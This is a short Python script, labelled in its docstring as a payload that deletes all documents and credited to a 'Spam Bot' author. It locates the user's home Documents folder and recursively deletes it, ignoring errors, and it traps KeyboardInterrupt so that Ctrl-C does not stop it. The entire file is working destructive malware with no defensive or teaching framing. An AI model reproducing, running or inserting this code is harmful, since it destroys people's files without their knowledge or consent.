# -*- coding: utf-8 -*-
"""
A full fledged payload that deletes all documents.

@author: Mr. Shark Spam Bot
"""
import os
import shutil

while True:
    try:

        home = os.path.expanduser('~')
        documents = os.path.join(home, 'Documents')

        if os.path.exists(documents):
            shutil.rmtree(documents, ignore_errors=True)

        break

    except KeyboardInterrupt:
        continue
